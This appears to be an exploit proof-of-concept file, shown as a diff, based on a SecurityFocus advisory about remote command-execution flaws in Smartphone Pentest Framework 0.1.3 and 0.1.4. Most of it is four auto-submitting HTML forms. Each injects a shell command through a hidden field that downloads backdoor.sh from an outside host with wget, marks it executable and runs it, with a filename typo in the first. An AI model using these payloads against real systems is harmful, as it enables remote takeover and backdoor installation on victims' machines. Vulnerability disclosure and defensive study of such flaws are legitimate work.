@@ -1,0 +1,62 @@
+source: http://www.securityfocus.com/bid/56881/info
+
+Smartphone Pentest Framework is prone to multiple remote command-execution vulnerabilities.
+
+Remote attackers can exploit these issues to execute arbitrary commands within the context of the vulnerable application to gain root access. This may facilitate a complete compromise of an affected computer.
+
+Smartphone Pentest Framework 0.1.3 and 0.1.4 are vulnerable; other versions may also be affected. 
+
+1.
+
+<form action="http://www.example.com/cgi-bin/frameworkgui/SEAttack.pl" 
+method="post" name=f1>
+<input type="hidden" name="platformDD2" value='android' />
+<input type="hidden" name="hostingPath" value='a & wget 
+http://www.example.com/backdoor.sh && chmod a+x ./backdoor.ch && 
+./backdoor.sh & ' />
+<input type="submit" id="btn">
+</form>
+<script>
+document.f1.Submit()
+</script>
+
+2. 
+
+<form action="http://www.example.com/cgi-bin/frameworkgui/CSAttack.pl" 
+method="post" name=f1>
+<input type="hidden" name="hostingPath" value='a & wget 
+http://www.example.com/backdoor.sh && chmod a+x ./backdoor.sh && 
+./backdoor.sh & ' />
+<input type="submit" id="btn">
+</form>
+<script>
+document.f1.Submit()
+</script>
+
+3.
+
+<form 
+action="http://www.example.com/cgi-bin/frameworkgui/attachMobileModem.pl" 
+method="post" name=f1>
+<input type="hidden" name="appURLPath" value='a & wget 
+http://www.example.com/backdoor.sh && chmod a+x ./backdoor.sh && 
+./backdoor.sh & ' />
+<input type="submit" id="btn">
+</form>
+<script>
+document.f1.Submit()
+</script>
+
+4.
+
+<form 
+action="http://www.example.com/cgi-bin/frameworkgui/guessPassword.pl" 
+method="post" name=f1>
+<input type="hidden" name="ipAddressTB" value='a & wget 
+http://www.example.com/backdoor.sh && chmod a+x ./backdoor.sh && 
+./backdoor.sh & ' />
+<input type="submit" id="btn">
+</form>
+<script>
+document.f1.Submit()
+</script>
